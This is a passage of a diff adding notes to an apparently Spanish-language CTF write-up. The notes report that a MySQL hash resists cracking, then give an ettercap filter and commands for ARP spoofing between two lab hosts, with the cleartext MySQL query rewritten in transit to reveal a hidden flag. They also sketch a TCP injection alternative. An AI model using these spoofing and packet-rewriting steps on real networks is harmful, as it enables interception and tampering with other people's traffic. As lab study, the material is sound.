@@ -149,4 +149,41 @@ $mysqlna$2f01175c66365c627e64724f0e352c17221e20215f3e:cf864a10ebb9948c212647766d
 hashcat -m 11200 -a 0 hash_listo.txt rockyou.txt
 ```
 
+> [!WARNING]
+> rockyou se agota sin resultado: la password NO es crackeable. Ese no es el camino.
+
+# Camino correcto: MITM activo (reescribir la query)
+
+La query capturada `SELECT flag FROM flag limit 0,1` devuelve `Not the flag yet but close!`
+(un señuelo). La flag real esta en otra fila. Como no tenemos la password para conectarnos
+solos, hay que modificar la query en transito aprovechando que MySQL va en claro.
+
+Cambio seguro (misma longitud, no rompe el seq TCP): `limit 0,1` -> `limit 0,9`
+(trae todas las filas de una).
+
+## ettercap (hace ARP spoof + forwarding + reescritura)
+
+Filtro `mitm_filter.ecf`:
+```c
+if (ip.proto == TCP && tcp.dst == 3306) {
+   if (search(DATA.data, "limit 0,1")) {
+      replace("limit 0,1", "limit 0,9");
+      msg("[+] Query reescrita\n");
+   }
+}
+```
+
+```sh
+etterfilter mitm_filter.ecf -o mitm_filter.ef
+tcpdump -i eth0 -w loot.pcap tcp port 3306 &
+ettercap -T -q -i eth0 -F mitm_filter.ef -M arp /172.18.0.3// /172.18.0.4//
+```
+
+## Otra opcion (porque no me funciono la de arriba)
+
+- No reenviar la query que pasa el usuario => corto la conexion
+- Rapidamente leer el sequence number del paquete y armar un paquete con la query que queremos
+
+Esto es complicado porque tiene que pasar todo rapido, habria que armar un script que lo haga
+
 
